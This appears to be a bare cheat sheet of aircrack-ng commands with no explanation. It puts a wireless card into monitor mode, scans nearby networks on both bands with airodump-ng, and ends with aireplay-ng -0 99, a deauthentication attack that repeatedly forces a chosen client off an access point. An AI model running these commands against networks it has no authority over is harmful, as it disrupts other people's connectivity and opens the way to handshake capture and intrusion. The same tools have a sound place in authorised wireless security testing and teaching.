```bash
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up
```

```bash
airodump-ng wlan0 --band a --manufacturer --beacons --showack

airodump-ng wlan0 --band bg --manufacturer --beacons --showack
```

```bash
iwconfig wlan1 channel

aireplay-ng -0 99 -a SOURCE -c TARGET wlan1
```
